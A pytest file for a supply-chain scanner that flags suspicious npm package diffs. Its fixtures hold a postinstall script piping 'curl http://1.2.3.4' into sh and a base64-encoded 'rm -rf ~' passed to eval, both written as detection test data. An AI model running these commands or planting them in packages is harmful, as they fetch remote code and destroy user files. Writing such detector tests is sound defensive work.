"""Tier 0 pattern scanner — USER-OWNED.

These tests pin the contract for ``kitsunox.analysis.tier0.patterns.scan``. They are
marked xfail(strict) so they flip to a hard failure once implemented correctly — that's
your signal to delete the marker.
"""

from __future__ import annotations

import pytest

from kitsunox.analysis.tier0 import patterns
from kitsunox.ir import ChangeType, Ecosystem, FileDiff, PackageRef, Severity, VersionMeta

pytestmark = pytest.mark.xfail(reason="USER-OWNED: implement patterns.scan()", strict=True)


def _meta(install_scripts=None) -> VersionMeta:
    return VersionMeta(
        ref=PackageRef(ecosystem=Ecosystem.NPM, name="demo"),
        version="1.1.0",
        install_scripts=install_scripts or {},
    )


def _added(path: str, body: str) -> FileDiff:
    return FileDiff(
        path=path,
        change_type=ChangeType.ADDED,
        is_binary=False,
        size_after=len(body),
        hunks=body,
    )


def test_flags_child_process_in_postinstall():
    diff = _added("install.js", "const cp = require('child_process');\ncp.exec('curl http://1.2.3.4|sh');\n")
    findings = patterns.scan([diff], _meta({"postinstall": "node install.js"}))
    rule_ids = {f.rule_id for f in findings}
    assert patterns.RULE_CHILD_PROCESS in rule_ids
    cp = next(f for f in findings if f.rule_id == patterns.RULE_CHILD_PROCESS)
    assert cp.file_path == "install.js"
    assert cp.severity in {Severity.HIGH, Severity.CRITICAL}  # elevated inside install script
    assert len(cp.evidence) <= patterns.EVIDENCE_MAX_CHARS


def test_flags_base64_to_eval():
    body = "eval(Buffer.from('cm0gLXJmIH4=', 'base64').toString());\n"
    findings = patterns.scan([_added("index.js", body)], _meta())
    assert patterns.RULE_BASE64_EXEC in {f.rule_id for f in findings}


def test_clean_code_produces_no_findings():
    body = "module.exports = function add(a, b) { return a + b; };\n"
    assert patterns.scan([_added("index.js", body)], _meta()) == []


def test_does_not_raise_on_binary_or_empty_diff():
    assert patterns.scan([], _meta()) == []
    bin_diff = FileDiff(path="a.node", change_type=ChangeType.ADDED, is_binary=True, size_after=10)
    assert patterns.scan([bin_diff], _meta()) == []
